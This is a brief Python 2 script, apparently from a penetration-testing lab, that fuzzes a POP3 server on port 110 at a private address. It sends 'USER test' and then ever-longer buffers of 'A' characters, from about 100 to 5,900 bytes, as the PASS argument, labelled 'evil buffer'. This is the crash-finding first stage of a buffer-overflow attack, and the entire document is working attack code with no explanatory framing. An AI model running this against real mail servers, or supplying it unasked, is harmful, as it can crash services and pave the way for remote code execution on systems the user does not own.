#!/usr/bin/python
import socket



buffer=["A"]
counter=100

while len(buffer) <= 30:
        buffer.append("A"*counter)
        counter=counter+200

for string in buffer:
        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                print "\nSending evil buffer ", len(string), "bytes"
                s.connect(('10.11.10.1',110))
                data = s.recv(1024)

                s.send('USER test' +'\r\n')
                data = s.recv(1024)

                s.send('PASS '  + string + '\r\n' )
                data = s.recv(1024)

                s.close()
                print "\nDone!"
        except:
                print "cannot connect to pop3 port 110"